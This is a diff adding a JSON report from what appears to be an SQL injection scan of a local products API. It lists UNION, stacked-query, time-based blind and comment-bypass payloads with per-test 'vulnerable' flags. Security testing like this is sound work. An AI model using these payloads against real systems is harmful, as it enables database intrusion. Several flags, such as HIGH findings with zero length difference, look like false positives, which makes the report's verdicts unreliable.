@@ -1,0 +1,1037 @@
+{
+  "target": "http://localhost:3001/api/products?sortBy=name&limit=5",
+  "scan_time": "2025-12-17 18:25:26",
+  "parameters_tested": [
+    "sortBy",
+    "limit"
+  ],
+  "total_tests": 98,
+  "vulnerabilities": [
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION NULL - Length diff: 23662",
+      "response_time": 0.0017681121826171875
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 2 cols - Length diff: 23662",
+      "response_time": 0.0015289783477783203
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 3 cols - Length diff: 23662",
+      "response_time": 0.0015339851379394531
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 4 cols - Length diff: 23662",
+      "response_time": 0.0023550987243652344
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 5 cols - Length diff: 23662",
+      "response_time": 0.0017919540405273438
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION ALL SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION ALL - Length diff: 23662",
+      "response_time": 0.0033202171325683594
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+      "severity": "HIGH",
+      "details": "UNION schema - Length diff: 23662",
+      "response_time": 0.003242015838623047
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": " UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION no quote - Length diff: 23662",
+      "response_time": 0.004808902740478516
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "1 UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION numeric - Length diff: 23662",
+      "response_time": 0.0023729801177978516
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/**/OR/**/1=1",
+      "severity": "MEDIUM",
+      "details": "Inline comment",
+      "response_time": 0.001577138900756836
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "'/**/OR/**/1=1--",
+      "severity": "MEDIUM",
+      "details": "Inline with quote",
+      "response_time": 0.0015208721160888672
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/*!50000OR*/1=1",
+      "severity": "MEDIUM",
+      "details": "MySQL version comment",
+      "response_time": 0.002373218536376953
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "#",
+      "severity": "MEDIUM",
+      "details": "Hash comment",
+      "response_time": 0.0017781257629394531
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "--",
+      "severity": "MEDIUM",
+      "details": "Double dash",
+      "response_time": 0.0014541149139404297
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/*",
+      "severity": "MEDIUM",
+      "details": "Block comment start",
+      "response_time": 0.0014181137084960938
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "' OR '1'='1'/*",
+      "severity": "MEDIUM",
+      "details": "Block comment end",
+      "response_time": 0.0016438961029052734
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION NULL - Length diff: 0",
+      "response_time": 0.04579782485961914
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 2 cols - Length diff: 0",
+      "response_time": 0.048020124435424805
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 3 cols - Length diff: 0",
+      "response_time": 0.0484919548034668
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 4 cols - Length diff: 0",
+      "response_time": 0.04916977882385254
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "severity": "HIGH",
+      "details": "UNION 5 cols - Length diff: 0",
+      "response_time": 0.049353837966918945
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION ALL SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION ALL - Length diff: 0",
+      "response_time": 0.04844999313354492
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+      "severity": "HIGH",
+      "details": "UNION schema - Length diff: 0",
+      "response_time": 0.04966902732849121
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": " UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION no quote - Length diff: 0",
+      "response_time": 0.05056405067443848
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "1 UNION SELECT NULL--",
+      "severity": "HIGH",
+      "details": "UNION numeric - Length diff: 176533",
+      "response_time": 0.05619502067565918
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT 1--",
+      "severity": "MEDIUM",
+      "details": "SELECT - Status: 200",
+      "response_time": 0.050942182540893555
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT version()--",
+      "severity": "MEDIUM",
+      "details": "version() - Status: 200",
+      "response_time": 0.08758020401000977
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT user--",
+      "severity": "MEDIUM",
+      "details": "user - Status: 200",
+      "response_time": 0.049514055252075195
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT current_database()--",
+      "severity": "MEDIUM",
+      "details": "current_database - Status: 200",
+      "response_time": 0.04671907424926758
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "1; SELECT 1--",
+      "severity": "MEDIUM",
+      "details": "Numeric stacked - Status: 200",
+      "response_time": 0.05277729034423828
+    }
+  ],
+  "all_results": [
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "'; SELECT pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' OR pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep OR"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "1; SELECT pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep numeric"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' AND (SELECT pg_sleep(3))='",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep AND"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' OR SLEEP(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' AND SLEEP(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP AND"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "1 OR SLEEP(3)",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP numeric"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' OR BENCHMARK(10000000,SHA1('test'))--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] BENCHMARK"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "'; WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' OR WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR OR"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "1; WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR numeric"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' OR DBMS_PIPE.RECEIVE_MESSAGE('x',3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[ORACLE] DBMS_PIPE"
+    },
+    {
+      "param": "sortBy",
+      "type": "Time-based Blind",
+      "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[ORACLE] DBMS_PIPE AND"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "'",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Single quote - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "\"",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Double quote - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "' OR '1'='1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR true - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "' AND '1'='2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND false - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "1'1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Syntax error - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "' OR ''='",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Empty string - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "\\",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Backslash - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "' HAVING 1=1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "HAVING - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "Error-based",
+      "payload": "' GROUP BY columnname HAVING 1=1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "GROUP BY - No SQL error"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION NULL - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 2 cols - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 3 cols - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 4 cols - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 5 cols - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION ALL SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION ALL - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION schema - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": " UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION no quote - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "UNION-based",
+      "payload": "1 UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION numeric - Length diff: 23662"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' AND 1=1--, FALSE: ' AND 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND boolean - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' OR 1=1--, FALSE: ' OR 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR boolean - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE:  AND 1=1--, FALSE:  AND 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND no quote - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE:  OR 1=1, FALSE:  OR 1=2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR no quote - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' AND 'a'='a, FALSE: ' AND 'a'='b",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "String compare - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Boolean-based",
+      "payload": "TRUE: 1 AND 1=1, FALSE: 1 AND 1=2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Numeric AND - TRUE len: 54, FALSE len: 54"
+    },
+    {
+      "param": "sortBy",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT 1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "SELECT - Status: 500"
+    },
+    {
+      "param": "sortBy",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT version()--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "version() - Status: 500"
+    },
+    {
+      "param": "sortBy",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT user--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "user - Status: 500"
+    },
+    {
+      "param": "sortBy",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT current_database()--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "current_database - Status: 500"
+    },
+    {
+      "param": "sortBy",
+      "type": "Stacked Queries",
+      "payload": "1; SELECT 1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Numeric stacked - Status: 500"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/**/OR/**/1=1",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Inline comment"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "'/**/OR/**/1=1--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Inline with quote"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/*!50000OR*/1=1",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "MySQL version comment"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "#",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Hash comment"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Double dash"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "/*",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Block comment start"
+    },
+    {
+      "param": "sortBy",
+      "type": "Comment Bypass",
+      "payload": "' OR '1'='1'/*",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Block comment end"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "'; SELECT pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' OR pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep OR"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "1; SELECT pg_sleep(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep numeric"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' AND (SELECT pg_sleep(3))='",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[POSTGRESQL] pg_sleep AND"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' OR SLEEP(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' AND SLEEP(3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP AND"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "1 OR SLEEP(3)",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] SLEEP numeric"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' OR BENCHMARK(10000000,SHA1('test'))--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MYSQL] BENCHMARK"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "'; WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' OR WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR OR"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "1; WAITFOR DELAY '0:0:3'--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[MSSQL] WAITFOR numeric"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' OR DBMS_PIPE.RECEIVE_MESSAGE('x',3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[ORACLE] DBMS_PIPE"
+    },
+    {
+      "param": "limit",
+      "type": "Time-based Blind",
+      "payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "[ORACLE] DBMS_PIPE AND"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "'",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Single quote - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "\"",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Double quote - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "' OR '1'='1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR true - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "' AND '1'='2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND false - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "1'1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Syntax error - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "' OR ''='",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Empty string - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "\\",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Backslash - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "' HAVING 1=1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "HAVING - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "Error-based",
+      "payload": "' GROUP BY columnname HAVING 1=1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "GROUP BY - No SQL error"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION NULL - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 2 cols - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 3 cols - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 4 cols - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION 5 cols - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION ALL SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION ALL - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION schema - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": " UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION no quote - Length diff: 0"
+    },
+    {
+      "param": "limit",
+      "type": "UNION-based",
+      "payload": "1 UNION SELECT NULL--",
+      "vulnerable": true,
+      "severity": "HIGH",
+      "details": "UNION numeric - Length diff: 176533"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' AND 1=1--, FALSE: ' AND 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND boolean - TRUE len: 23716, FALSE len: 23716"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' OR 1=1--, FALSE: ' OR 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR boolean - TRUE len: 23716, FALSE len: 23716"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE:  AND 1=1--, FALSE:  AND 1=2--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "AND no quote - TRUE len: 23716, FALSE len: 23716"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE:  OR 1=1, FALSE:  OR 1=2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "OR no quote - TRUE len: 23716, FALSE len: 23716"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE: ' AND 'a'='a, FALSE: ' AND 'a'='b",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "String compare - TRUE len: 23716, FALSE len: 23716"
+    },
+    {
+      "param": "limit",
+      "type": "Boolean-based",
+      "payload": "TRUE: 1 AND 1=1, FALSE: 1 AND 1=2",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Numeric AND - TRUE len: 200249, FALSE len: 200249"
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT 1--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "SELECT - Status: 200"
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT version()--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "version() - Status: 200"
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT user--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "user - Status: 200"
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "'; SELECT current_database()--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "current_database - Status: 200"
+    },
+    {
+      "param": "limit",
+      "type": "Stacked Queries",
+      "payload": "1; SELECT 1--",
+      "vulnerable": true,
+      "severity": "MEDIUM",
+      "details": "Numeric stacked - Status: 200"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "/**/OR/**/1=1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Inline comment"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "'/**/OR/**/1=1--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Inline with quote"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "/*!50000OR*/1=1",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "MySQL version comment"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "#",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Hash comment"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "--",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Double dash"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "/*",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Block comment start"
+    },
+    {
+      "param": "limit",
+      "type": "Comment Bypass",
+      "payload": "' OR '1'='1'/*",
+      "vulnerable": false,
+      "severity": "INFO",
+      "details": "Block comment end"
+    }
+  ]
+}
